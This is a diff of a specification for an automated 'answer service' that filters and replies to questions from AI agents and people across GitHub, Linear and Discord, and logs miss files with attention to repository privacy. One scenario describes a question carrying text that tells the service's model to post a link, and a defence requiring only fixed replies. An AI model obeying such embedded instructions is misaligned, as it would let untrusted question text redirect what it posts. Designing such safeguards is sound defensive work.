   is named by one hash* says
-- **AND** if the session stopped before saving the reply's id, the miss
+- **AND** if the service stopped before saving the reply's id, the miss
   file's push, whose name needs that id, is dropped, and the asker,
   finding no miss file to back the reply, takes it as input
 
@@ -2578,8 +2549,8 @@ giving one of two reasons:
 
 Under the second reason, on a person's question as on an agent's, the
 person SHALL pick the filter that should have stopped the question: 1,
-already answered; 2, can wait; 3, one option has merit; or 4, cheap to
-reverse. The answer session SHALL show them the exact post of that
+already answered; 2, can wait; 3, not a real question (one option has merit); or 4, cheap to
+reverse. The answer service SHALL show them the exact post of that
 filter's reply, and post it, naming the question, only once they confirm
 it.
 
@@ -2588,7 +2559,7 @@ it.
 - **WHEN** the person declines an agent's GitHub question for the
   inquisitor, picks filter 4, and types the note "a config flag, easy to
   flip"
-- **THEN** the answer session shows filter 4's reply exactly as it will
+- **THEN** the answer service shows filter 4's reply exactly as it will
   be posted, posts it naming the question only once the person confirms
   it, and logs a miss file whose `filter` is `"4"` and whose `said` is
   that note
@@ -2604,7 +2575,7 @@ it.
 
 The person's post for filter 2, 3 or 4 SHALL be its fixed `Inquisitor: `
 text plus the line `The person chose this filter.`, which no post the
-answer session makes by itself holds.
+answer service makes by itself holds.
 
 #### Scenario: The person's filter 3 reply ends with the chosen line
 
@@ -2617,7 +2588,7 @@ answer session makes by itself holds.
 The person's post for filter 1 SHALL be a recorded answer in the form
 filter 1's automatic post has, its `Recorded in: ` line holding the URL
 of the place the person gave, or of one filter 1 found that they chose.
-The session SHALL refuse to post one whose URL holds a space or line
+The service SHALL refuse to post one whose URL holds a space or line
 break, telling the person why.
 
 #### Scenario: A filter 1 reply names the place the person gave
@@ -2633,11 +2604,11 @@ break, telling the person why.
 
 - **WHEN** the draft of a filter 1 reply has a `Recorded in: ` value
   holding a space or a line break
-- **THEN** the answer session posts nothing, and tells the person why
+- **THEN** the answer service posts nothing, and tells the person why
 
 ### Requirement: The preview warns when a filter 1 record is more private than the thread
 
-Before the person confirms a filter 1 reply, the answer session shows them
+Before the person confirms a filter 1 reply, the answer service shows them
 a preview of the post. When the reply's record is more private than the
 thread, by the rule of *A recorded answer is posted by itself only when no
 more private than its thread*, that preview SHALL also warn that posting
@@ -2669,7 +2640,7 @@ category, it SHALL post nothing and close the question.
 #### Scenario: A decline on a question with a category posts nothing
 
 - **WHEN** the person declines for the inquisitor a GitHub question the
-  session's model judges has a category
+  service's model judges has a category
 - **THEN** nothing is posted in the thread, and the question closes
 
 ### Requirement: Filter 3 also offers that the agent shouldn't have asked
@@ -2690,7 +2661,7 @@ the advice to take the option with merit.
 ### Requirement: A decline for the inquisitor logs a miss once it takes effect
 
 Under the second reason of *The person can decline to answer*, the person MAY give a note, and on an agent's
-question the answer session SHALL log a
+question the answer service SHALL log a
 miss against the picked filter. The miss's `said` is the note or, with
 none, `the inquisitor should have handled it`. It SHALL push the miss
 only once the decline's post is out or, when it posts nothing, once the
@@ -2708,7 +2679,7 @@ person confirms it.
 
 - **WHEN** the person declines a person's question for the inquisitor
   with any filter, or agrees to a recorded answer or a suggested verdict
-  that the session shows beside a person's question
+  that the service shows beside a person's question
 - **THEN** no miss file is pushed, hash-only or not
 
 ### Requirement: A decline with nothing posted closes a thread copy on this machine only
@@ -2746,7 +2717,7 @@ editing that post.
 #### Scenario: A question declined with a post is not reopened
 
 - **WHEN** the person declined a question under the second reason, and
-  the answer session posted that filter's reply
+  the answer service posted that filter's reply
 - **THEN** no way to reopen it is offered, and the person can change the
   handling only by editing that post
 
@@ -2759,11 +2730,11 @@ editing that post.
 
 ### Requirement: Filter 1 runs on every incoming question not placed `other`
 
-Before the answer session shows a question, whoever asked it, it SHALL
+Before the answer service shows a question, whoever asked it, it SHALL
 run filter 1 on it, unless it is an item question or placed `other`,
 through the inquisitor script's `search` command, which reads issues
 with the person's credentials, as the inquisitor's *Filter 1 searches
-every place an answer is recorded* and *Only an answer with authority stops a question* say. The session's
+every place an answer is recorded* and *Only an answer with authority stops a question* say. The service's
 model judges whether a hit with authority answers the question; a hit
 that is only input stops nothing.
 
@@ -2773,22 +2744,20 @@ that is only input stops nothing.
 - **THEN** nothing is posted by itself, and the question is shown with
   that hit labelled as input
 
-### Requirement: The answer session's filter 1 reads only subscribed and lore repositories
+### Requirement: The answer service's filter 1 reads only subscribed and lore repositories
 
-The session SHALL fetch a subscribed repository's default
+The service SHALL fetch a subscribed repository's default
 branch just before filter 1 checks a question placed in it, and at no
 other time. A question placed
-`other` SHALL go unsearched, and the session SHALL say so, because a
-`global` lore entry may contradict an unread repository's rules. A
-question placed in no subscribed or lore repository for any other reason
-SHALL be searched in `global` lore alone.
+`other` SHALL go unsearched, and the service SHALL say so, because a
+`global` lore entry may contradict an unread repository's rules. A question placed in no subscribed or lore repository for any other reason names no repository whose rules go unread, so it SHALL be searched in `global` lore alone.
 
 #### Scenario: A question about an unsubscribed repository is not searched
 
 - **WHEN** a question in a subscribed `o/web` thread concerns `o/api`,
   which no subscription names
 - **THEN** its verdict's `place` is `other`, filter 1 searches nothing
-  for it, `global` lore entries included, and the session shows that
+  for it, `global` lore entries included, and the service shows that
   nothing was searched
 - **AND** a question about subscribed `o/web` has its clone's default
   branch fetched then, not at each poll, and the decision documents there,
@@ -2801,9 +2770,9 @@ SHALL be searched in `global` lore alone.
 
 ### Requirement: A question with a category reaches filter 1 on standard input
 
-The session's model SHALL first judge whether the question has a
+The service's model SHALL first judge whether the question has a
 category, as the inquisitor's *Some questions are recorded by hash only*
-defines one. The answer session SHALL pass a question with a category to
+defines one. The answer service SHALL pass a question with a category to
 the `search` command on standard input, which keeps its search on the
 machine under the inquisitor's *The search command takes its question as
 the first call does*, and SHALL post nothing by itself on it; it SHALL
@@ -2812,7 +2781,7 @@ pass any other question in a private file.
 #### Scenario: A question with a category is searched on the machine only
 
 - **WHEN** a Discord message that holds a password reaches the answer
-  session
+  service
 - **THEN** it is passed to the script on standard input, the search
   reaches no source off the machine, and nothing is posted by itself
 - **AND** a message with no category is passed in a private file
@@ -2820,7 +2789,7 @@ pass any other question in a private file.
 ### Requirement: Filter 1 posts a recorded answer by itself in the question's thread
 
 When an answer with authority is recorded for a question read from its
-thread, the answer session SHALL answer it by itself, whoever asked,
+thread, the answer service SHALL answer it by itself, whoever asked,
 unless another requirement says it posts nothing by itself on that
 question, as for one with no place or a category. It posts through
 the relay
@@ -2840,13 +2809,13 @@ Recorded in: <the URL of where the answer is recorded>
 
 ### Requirement: A recorded answer posted by itself links filter 1's hit and quotes no answer
 
-In a recorded answer the answer session posts by itself, the URL SHALL
+In a recorded answer the answer service posts by itself, the URL SHALL
 be filter 1's hit's: for a questions-branch file, the file's own URL on
 that branch, never a URL the file holds. Whatever the hit, its path
 SHALL be percent-encoded as GitHub's own links are, so that no space or
 line break in it can break the `Recorded in: ` line or plant a `Re: `
 line. Whatever the hit is, a log file
-included, the post SHALL quote no answer, and the session's model SHALL
+included, the post SHALL quote no answer, and the service's model SHALL
 write none of the post.
 
 #### Scenario: A recorded answer is posted by itself
@@ -2864,7 +2833,7 @@ write none of the post.
 #### Scenario: A log file hit links the file, not its recorded_in
 
 - **WHEN** filter 1's hit for an agent's question is an answer file the
-  answer session pushed to `o/api`'s questions branch, whose `recorded_in`
+  answer service pushed to `o/api`'s questions branch, whose `recorded_in`
   is a relay post
 - **THEN** the `Recorded in: ` line holds the answer file's URL on
   `o/api`'s questions branch, not the relay post's
@@ -2885,7 +2854,7 @@ write none of the post.
 
 ### Requirement: A recorded answer is posted by itself only when no more private than its thread
 
-The answer session SHALL post a recorded answer by itself only when the
+The answer service SHALL post a recorded answer by itself only when the
 record is no more private than the question's thread: on GitHub, when the
 record's repository is at least as visible as the thread's; on Linear and
 Discord, whose readers it cannot check, only when the record's repository
@@ -2915,13 +2884,13 @@ more private repository* defines it, stands in for its repository's.
 
 - **WHEN** a public repository's decision document answers a question
   asked in a Discord thread
-- **THEN** the answer session posts the recorded answer by itself
+- **THEN** the answer service posts the recorded answer by itself
 
 ### Requirement: A recorded answer not posted by itself is shown beside its question
 
-The answer session SHALL show a recorded answer beside its question, and
+The answer service SHALL show a recorded answer beside its question, and
 post only what the person relays or confirms, when filter 1 finds an
-answer with authority that the session does not post by itself, and
+answer with authority that the service does not post by itself, and
 always for a question with no thread.
 
 #### Scenario: A questions-branch question's recorded answer is shown, not posted
@@ -2936,7 +2905,7 @@ always for a question with no thread.
 
 The person may agree to a recorded answer shown beside a question: a
 decline under the second reason with filter 1, naming that record, which
-the answer session SHALL handle exactly as *Declining for the inquisitor
+the answer service SHALL handle exactly as *Declining for the inquisitor
 posts the picked filter's reply* and the requirements after it say.
 
 #### Scenario: Agreeing on a question with no thread is a filter 1 decline
@@ -2952,12 +2921,12 @@ posts the picked filter's reply* and the requirements after it say.
   thread, and the person agrees, after the warning, to a recorded answer
   more private than that thread
 - **THEN** the relay posts the recorded answer in the thread, and the
-  answer session pushes a handled file naming that log file and no
+  answer service pushes a handled file naming that log file and no
   answer file, besides the decline's miss
 
 ### Requirement: A lore entry posted as a recorded answer gets a citation file
 
-When the answer session posts a recorded answer by itself, with no
+When the answer service posts a recorded answer by itself, with no
 confirmation from the person, and the record is a lore entry, it SHALL push
 a citation file unless a bar in the inquisitor's *A lore entry that stops a
 question gets a citation file* applies.
@@ -2967,12 +2936,12 @@ question gets a citation file* applies.
 - **WHEN** an active lore entry in the public `o/lore` answers a
   question about the public `o/web` in an `o/web` thread, so *A recorded
   answer is posted by itself only when no more private than its thread*
-  lets the session post it by itself
-- **THEN** the session posts the recorded answer through the relay, and
+  lets the service post it by itself
+- **THEN** the service posts the recorded answer through the relay, and
   pushes, through the inquisitor's script, a citation file to `o/lore`'s
   questions branch
 - **AND** where the same entry answers a question about the private
-  `o/api` in an `o/api` thread, the session posts the recorded answer but
+  `o/api` in an `o/api` thread, the service posts the recorded answer but
   pushes no citation file, since `o/lore` is more visible than `o/api`
 
 ### Requirement: A person's cite of an active entry in scope pushes a citation file
@@ -3010,27 +2979,27 @@ cite SHALL push nothing.
   question, about the organization, was asked in a private repository's thread; its
   miss would go to the team's lore repository, a public one; and the
   person has not confirmed the miss for that more visible branch
-- **THEN** no miss file is pushed, and the answer session still pushes
+- **THEN** no miss file is pushed, and the answer service still pushes
   one citation file, to the entry's lore repository
 
 ### Requirement: Filter 1's answer by itself to an agent's question logs a miss
 
-When the answer session answers an agent's question by itself under
+When the answer service answers an agent's question by itself under
 filter 1, it SHALL log a miss against filter 1, since the asking agent's
 own filter 1 should have found the record. The miss goes where *The
-answer session logs its misses on the questions branch of what the
+answer service logs its misses on the questions branch of what the
 question concerns* says.
 
 #### Scenario: An agent's question answered by itself logs a miss
 
-- **WHEN** the answer session answers an agent's GitHub question by
+- **WHEN** the answer service answers an agent's GitHub question by
   itself under filter 1
 - **THEN** it logs a miss against filter 1 whose `said` is
-  `answer session: clearly filter 1`
+  `answer service: clearly filter 1`
 
 ### Requirement: No automatic post repeats one in its chain of replies
 
-The answer session SHALL NOT make by itself an automatic post whose
+The answer service SHALL NOT make by itself an automatic post whose
 text, apart from its `Re: ` line, `question <n>: ` number and
 `The person chose this filter.` line, matches an earlier automatic
 post's in the question's chain of replies, but shows the person the
@@ -3041,7 +3010,7 @@ relay post.
 
 #### Scenario: A repeated automatic post goes to the person
 
-- **WHEN** the answer session replied to an agent's question with filter
+- **WHEN** the answer service replied to an agent's question with filter
   2's text, the agent replied with a question it answered with filter 4's
   text, and the agent replies again with a question that clearly fails
   filter 2 or filter 4
@@ -3051,7 +3020,7 @@ relay post.
 
 When an agent's question whose place a concerns line settles clearly
 fails filter 2, 3 or 4, and the relay can post in its thread, the answer
-session SHALL post the filter's fixed text there by itself, log its miss
+service SHALL post the filter's fixed text there by itself, log its miss
 and list the question as handled, unless *No automatic post repeats one
 in its chain of replies*, *A question with a person-required line gets
 no filter 2 to 4 reply* or *An automatic Inquisitor reply goes out only
@@ -3061,7 +3030,7 @@ with a miss file* bars it.
 
 - **WHEN** an agent's question in a subscribed repository, followed by
   its concerns line, clearly can wait until its pull request is reviewed
-- **THEN** the answer session posts through the relay, naming the
+- **THEN** the answer service posts through the relay, naming the
   question, `Inquisitor: filter 2, deferrable. Carry on without an
   answer, list this question as not done in the current work, and file
   an issue for it if it outlives the work.`, logs a miss against filter
@@ -3080,19 +3049,16 @@ with a miss file* bars it.
 
 - **WHEN** an agent's question holds text telling the model to post a
   link
-- **THEN** whatever the model judges, the answer session posts by itself
+- **THEN** whatever the model judges, the answer service posts by itself
   only one of the three fixed `Inquisitor: ` texts, or the fixed
   recorded-answer text whose URL is filter 1's hit
 
 ### Requirement: A question with a person-required line gets no filter 2 to 4 reply
 
-A question, whoever posted it, with a line among its related-decision
-and person-required lines directly after it that, reduced as the
-inquisitor reduces a question's text, starts with the inquisitor's
-person-required line up to `(required by `, SHALL get no filter 2, 3 or
+A question, whoever posted it, is **person-required** when a related-decision or person-required line directly after it starts, reduced as the inquisitor reduces a question's text, with the inquisitor's person-required line up to `(required by `. Such a question SHALL get no filter 2, 3 or
 4 reply, by itself, by a suggested verdict or by the person's decline,
 and no miss for those filters. Unless filter 1 answers it, it SHALL be
-shown to the person. The answer session SHALL trust any such line.
+shown to the person. The answer service SHALL trust any such line.
 
 #### Scenario: A question spec-trace requires reaches the person
 
@@ -3108,7 +3074,7 @@ shown to the person. The answer session SHALL trust any such line.
 
 - **WHEN** an agent posts a question that clearly fails filter 3, followed
   by `Inquisitor: a person must decide this (required by spec-trace).`,
-  and posts it with the person's own `gh` login, so the answer session
+  and posts it with the person's own `gh` login, so the answer service
   counts it as a person's question
 - **THEN** no filter is suggested and nothing is posted by itself; a
   decline for the inquisitor offers only filter 1
@@ -3132,7 +3098,7 @@ shown to the person. The answer session SHALL trust any such line.
 
 On a person's question, a relayed one included, on an agent's question
 of the fourth source, a questions-branch log file, and on an agent's
-question no concerns line settles, the answer session SHALL post
+question no concerns line settles, the answer service SHALL post
 nothing by itself, but show the question with its suggested verdict,
 unless it carries a person-required line, which gets no suggestion. Agreeing
 to the verdict is a decline under the second reason, *The inquisitor should
@@ -3167,9 +3133,9 @@ have handled it*, with that filter.
   person chose says they chose it* sets, and a miss against filter 4 is
   logged
 
-### Requirement: The answer session logs its misses on the questions branch of what the question concerns
+### Requirement: The answer service logs its misses on the questions branch of what the question concerns
 
-The answer session SHALL log each miss as a miss file, whether or not
+The answer service SHALL log each miss as a miss file, whether or not
 the asker logged the question, and the inquisitor script SHALL push it
 to the questions branch of what the question
 concerns, under the inquisitor's *A question is pushed to the questions
@@ -3177,15 +3143,15 @@ branch of what it concerns*.
 
 #### Scenario: A miss goes to the questions branch
 
-- **WHEN** the answer session logs a miss for an agent's question about
+- **WHEN** the answer service logs a miss for an agent's question about
   `o/api`
 - **THEN** the script pushes the miss file to `misses/` on the questions
   branch of `o/api`, and opens no pull request
 
 ### Requirement: A miss records who judged it and where it was asked from
 
-A miss the answer session logs by itself SHALL say
-`answer session: clearly filter <n>` in `said`. A miss's `asked_from`
+A miss the answer service logs by itself SHALL say
+`answer service: clearly filter <n>` in `said`. A miss's `asked_from`
 SHALL be the first of these that applies: the repository of the branch it
 is pushed to, once the person confirms sending it somewhere more visible;
 the most private `asked_from` of the questions-branch files holding its
@@ -3208,7 +3174,7 @@ repository.
   question, with `asked_from: "o/public-item"`, a public repository, and
   `asked_from: "o/private-item"`, a private one, and the person declines
   it for the inquisitor
-- **THEN** the answer session passes `asked_from: "o/private-item"` to
+- **THEN** the answer service passes `asked_from: "o/private-item"` to
   the `log` command with the miss's other keys, and the miss file holds
   it and no `repository`
 
@@ -3239,7 +3205,7 @@ repository.
 
 A miss on questions-branch files SHALL hold the `repository` they all
 hold, or none when none of them holds one; when their `repository` keys
-differ, one file lacking the key included, the answer session SHALL write
+differ, one file lacking the key included, the answer service SHALL write
 no miss file and SHALL tell the person why. Any other miss SHALL hold as
 `repository` the repository the question concerns, or none for a
 collective's question.
@@ -3264,20 +3230,18 @@ collective's question.
   file holds the question
 - **THEN** the miss file holds `repository: "o/api"`
 
-### Requirement: The answer session writes no miss it cannot place privately
+### Requirement: The answer service writes no miss it cannot place privately
 
-The answer session SHALL write no miss file, even where another
+The answer service SHALL write no miss file, even where another
 requirement logs one, telling the person why, when any of these holds:
 
 - the question has a category;
 - it concerns no place the code lists for `record_verdict`;
 - the person cannot push to that place's questions branch;
 - the miss's branch is more visible than its thread (or, with no
-  thread, than the file it was shown from), the person has not confirmed
-  the miss, and no `Inquisitor: ` reply goes out for a hash-only file to
-  back.
+  thread, than the file it was shown from), the person has not confirmed the miss, and no `Inquisitor: ` reply needs a hash-only file to back it.
 
-#### Scenario: No miss goes outside the session's places or to a branch closed to the person
+#### Scenario: No miss goes outside the service's places or to a branch closed to the person
 
 - **WHEN** the person declines, for filter 3, an agent's question that
   concerns nothing listed: no repository or collective; `o/api`, which no
@@ -3289,7 +3253,7 @@ requirement logs one, telling the person why, when any of these holds:
 #### Scenario: A question with a category gets no miss
 
 - **WHEN** the person's decline for the inquisitor is of an agent's
-  Discord message the session's model judges holds a password
+  Discord message the service's model judges holds a password
 - **THEN** nothing is posted, and the person is told why no miss file is
   written
 
@@ -3320,7 +3284,7 @@ requirement logs one, telling the person why, when any of these holds:
 ### Requirement: A miss more visible than its thread is pushed as a hash-only file
 
 Where the questions branch is more visible than the question's thread
-and the miss is unconfirmed, the answer session SHALL back each
+and the miss is unconfirmed, the answer service SHALL back each
 `Inquisitor: ` reply that logs a miss with a hash-only miss file pushed
 after the reply, as the inquisitor's *A hash-only miss file shows
 nothing but that it exists* defines one. In that case a `Recorded answer: ` post logs no
@@ -3331,18 +3295,18 @@ agent checks its `Recorded in: ` link instead.
 
 - **WHEN** an agent's question about a public repository, which its
   concerns line settles, is asked in a private repository's GitHub
-  thread, or on Linear or Discord, and the session posts an
+  thread, or on Linear or Discord, and the service posts an
   `Inquisitor: ` reply by itself or the person declines with one without
   confirming the miss
 - **THEN** the reply goes out as it would with a readable miss, and the
-  session pushes a hash-only miss file to the public repository's
+  service pushes a hash-only miss file to the public repository's
   questions branch
 - **AND** for a `Recorded answer: ` post there, by itself or for a filter
   1 decline, no miss file is pushed
 
 ### Requirement: An automatic Inquisitor reply goes out only with a miss file
 
-The answer session SHALL post an `Inquisitor: ` reply by itself only
+The answer service SHALL post an `Inquisitor: ` reply by itself only
 where it writes that reply's miss file, readable or hash-only, to a
 questions branch the person can push to, and otherwise SHALL show the
 person the question.
@@ -3352,5 +3316,5 @@ person the question.
 - **WHEN** an agent's question clearly fails filter 4, and the two
   questions-branch files holding it name different repositories, so its
   miss file has no one repository to name
-- **THEN** the session posts no reply by itself, and shows the person the
+- **THEN** the service posts no reply by itself, and shows the person the
   question
